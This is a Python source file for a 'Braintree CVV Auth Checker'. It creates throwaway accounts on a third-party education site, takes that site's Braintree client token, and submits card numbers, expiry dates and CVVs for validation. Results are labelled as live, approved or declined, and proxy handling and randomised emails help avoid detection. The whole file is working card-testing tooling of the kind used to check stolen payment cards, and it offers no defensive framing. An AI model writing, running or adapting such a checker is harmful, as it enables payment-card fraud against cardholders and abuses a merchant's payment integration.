"""
Braintree CVV Auth Checker
Uses direct Braintree API for CVV validation via tokenization.
Uses requests.Session (not httpx) to avoid Client.init() compatibility issues.
- trust_env=False to avoid HTTP_PROXY/HTTPS_PROXY (e.g. IPv6) causing "Invalid IPv6 URL".
- Proxy normalization: IPv4-only, skip IPv6 or malformed; retry without proxy on proxy errors.
"""

import asyncio
import random
import uuid
import base64
import json
from concurrent.futures import ThreadPoolExecutor
from typing import Optional

import requests

executor = ThreadPoolExecutor(max_workers=10)


def _normalize_proxy_braintree(proxy: Optional[str]) -> Optional[str]:
    """
    Return a requests-safe proxy URL (IPv4-friendly only) or None.
    Skips IPv6 and malformed URLs to avoid 'Invalid IPv6 URL' / proxy errors.
    """
    if not proxy or not str(proxy).strip():
        return None
    raw = str(proxy).strip()
    # Reject IPv6-style (brackets or too many colons)
    if "[" in raw or "]" in raw or raw.count(":") > 4:
        return None
    if raw.startswith(("http://", "https://")):
        url = raw
    else:
        url = f"http://{raw}"
    # Basic sanity: must look like http(s)://host:port or ...user:pass@host:port
    if "://" not in url or len(url) < 12:
        return None
    return url


def generate_random_email() -> str:
    """Generate random email address."""
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    username = ''.join(random.choices(chars, k=10))
    domains = ["gmail.com", "outlook.com", "yahoo.com", "protonmail.com"]
    return f"{username}@{random.choice(domains)}"


def _is_proxy_error(e: Exception) -> bool:
    s = str(e)
    return (
        "IPv6" in s or "Invalid IPv6" in s or "invalid ipv6" in s.lower()
        or isinstance(e, (requests.exceptions.ProxyError, requests.exceptions.ConnectionError))
    )


def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Optional[str] = None) -> dict:
    """
    Check Braintree CVV authentication via Pixorize.
    Uses requests.Session; trust_env=False to avoid env HTTP_PROXY (e.g. IPv6).
    Retries without proxy on proxy-related errors (e.g. Invalid IPv6 URL).
    """
    if len(ano) == 4:
        ano = ano[2:]
    if len(mes) == 1:
        mes = f"0{mes}"

    proxy_url = _normalize_proxy_braintree(proxy)
    proxy_options = [proxy_url] if proxy_url else []
    proxy_options.append(None)  # always retry without proxy if first fails
    last_error = {"status": "error", "response": "Request failed"}

    for use_proxy in proxy_options:
        session = None
        try:
            proxies = None
            if use_proxy:
                proxies = {"http": use_proxy, "https": use_proxy}

            session = requests.Session()
            session.trust_env = False
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json",
                "sec-ch-ua": '"Chromium";v="120", "Not/A)Brand";v="24"',
                "sec-ch-ua-platform": '"Android"',
                "sec-ch-ua-mobile": "?1",
                "Origin": "https://pixorize.com",
                "Referer": "https://pixorize.com/",
            })

            kw = {"timeout": 60, "allow_redirects": True}
            if proxies:
                kw["proxies"] = proxies

            email = generate_random_email()
            r = session.post(
                "https://apitwo.pixorize.com/users/register-simple",
                json={"email": email, "password": f"Pass{random.randint(1000, 9999)}!@#", "learner_classification": 1},
                **kw
            )
            if r.status_code not in (200, 201):
                last_error = {"status": "error", "response": "Registration Failed"}
                continue

            r = session.get("https://apitwo.pixorize.com/braintree/token", **kw)
            if r.status_code != 200:
                last_error = {"status": "error", "response": "Token Fetch Failed"}
                continue

            try:
                token_data = r.json()
            except Exception as e:
                last_error = {"status": "error", "response": f"Token JSON parse failed: {str(e)[:25]}"}
                continue

            payload = token_data.get("payload") if isinstance(token_data, dict) else None
            client_token = (payload or {}).get("clientToken") if payload else None
            if not client_token:
                last_error = {"status": "error", "response": "No clientToken in payload"}
                continue

            try:
                decoded = base64.b64decode(client_token).decode("utf-8")
                auth_fingerprint = json.loads(decoded).get("authorizationFingerprint")
            except Exception as e:
                last_error = {"status": "error", "response": f"Token decode failed: {str(e)[:25]}"}
                continue
            if not auth_fingerprint:
                last_error = {"status": "error", "response": "No authorizationFingerprint in token"}
                continue

            tokenize_payload = {
                "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": str(uuid.uuid4())},
                "query": """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        brandCode
                        last4
                        expirationMonth
                        expirationYear
                        binData {
                            prepaid
                            healthcare
                            debit
                            commercial
                            issuingBank
                            countryOfIssuance
                        }
                    }
                }
            }""",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": card,
                            "expirationMonth": mes,
                            "expirationYear": f"20{ano}",
                            "cvv": cvv,
                            "billingAddress": {
                                "postalCode": "10001",
                                "streetAddress": "123 Main St",
                                "locality": "New York",
                                "region": "NY",
                                "countryCodeAlpha2": "US",
                            },
                        },
                        "options": {"validate": True},
                    }
                },
                "operationName": "TokenizeCreditCard",
            }
            bt_headers = {
                "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0 Chrome/120.0"),
                "Content-Type": "application/json",
                "Authorization": f"Bearer {auth_fingerprint}",
                "Braintree-Version": "2018-05-10",
                "Origin": "https://assets.braintreegateway.com",
                "Referer": "https://assets.braintreegateway.com/",
            }
            r = session.post("https://payments.braintree-api.com/graphql", json=tokenize_payload, headers=bt_headers, **kw)

            try:
                data = r.json()
            except Exception:
                last_error = {"status": "error", "response": "Invalid API Response (not JSON)"}
                continue
            if not isinstance(data, dict):
                last_error = {"status": "error", "response": "Invalid API Response"}
                continue

            errors = data.get("errors")
            if errors and isinstance(errors, list):
                err = errors[0] if errors else {}
                error_msg = err.get("message", "Unknown Error") if isinstance(err, dict) else str(err)
                u = str(error_msg).upper()
                if any(x in u for x in ("CVV", "CVC", "SECURITY CODE")):
                    return {"status": "ccn", "response": "CCN LIVE - Wrong CVV"}
                if any(x in u for x in ("DECLINED", "INVALID", "EXPIRED", "DO NOT HONOR", "INSUFFICIENT", "LOST", "STOLEN", "FRAUD", "RESTRICTED", "NOT PERMITTED", "PICKUP", "REVOKED")):
                    return {"status": "declined", "response": f"Declined: {error_msg[:60]}"}
                if any(x in u for x in ("FAILED", "UNABLE", "CANNOT", "BLOCKED")):
                    return {"status": "declined", "response": f"Validation Failed: {error_msg[:50]}"}
                last_error = {"status": "error", "response": f"Error: {error_msg[:60]}"}
                continue

            inner = data.get("data")
            if isinstance(inner, dict):
                tr = inner.get("tokenizeCreditCard")
                if isinstance(tr, dict) and tr.get("token"):
                    cc = tr.get("creditCard") or {}
                    bd = cc.get("binData") or {}
                    bank = (bd.get("issuingBank") or "Unknown")[:20]
                    country = bd.get("countryOfIssuance") or "Unknown"
                    brand = cc.get("brandCode") or "Unknown"
                    return {"status": "approved", "response": f"CVV VALID ✓ | {brand} | Bank: {bank}"}
                return {"status": "declined", "response": "Tokenization Failed - No Token"}
            last_error = {"status": "declined", "response": "Unknown Response"}
            continue

        except requests.exceptions.Timeout:
            last_error = {"status": "error", "response": "Request Timeout"}
            return last_error
        except requests.exceptions.ConnectionError:
            last_error = {"status": "error", "response": "Connection Error"}
            if use_proxy:
                continue
            return last_error
        except requests.exceptions.ProxyError:
            last_error = {"status": "error", "response": "Proxy Error"}
            if use_proxy:
                continue
            return last_error
        except Exception as e:
            last_error = {"status": "error", "response": f"Error: {str(e)[:50]}"}
            if use_proxy and _is_proxy_error(e):
                try:
                    if session:
                        session.close()
                except Exception:
                    pass
                continue
            return last_error
        finally:
            if session is not None:
                try:
                    session.close()
                except Exception:
                    pass

    return last_error


async def async_check_braintree_cvv(
    card: str, 
    mes: str, 
    ano: str, 
    cvv: str, 
    proxy: Optional[str] = None
) -> dict:
    """
    Async wrapper for Braintree CVV checking.
    
    Args:
        card: Card number
        mes: Expiry month
        ano: Expiry year
        cvv: CVV code
        proxy: Optional proxy
        
    Returns:
        dict with status and response
    """
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        executor, 
        check_braintree_cvv_sync, 
        card, mes, ano, cvv, proxy
    )
